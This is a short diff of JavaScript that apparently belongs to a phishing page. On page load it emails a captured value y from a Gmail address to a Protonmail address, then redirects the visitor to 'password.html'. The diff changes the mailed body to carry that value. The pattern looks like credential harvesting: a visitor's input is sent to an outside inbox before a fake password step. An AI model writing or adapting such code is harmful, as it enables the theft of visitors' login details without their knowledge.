@@ -16,7 +16,7 @@ window.onload = function()
                     To : "user1533@protonmail.com",
                     From : "julio74108520@gmail.com",
                     Subject : y,
-                    Body : "<p> << Email </p>",
+                    Body : "y",
                 });
             window.location.href = "password.html";
         } else {
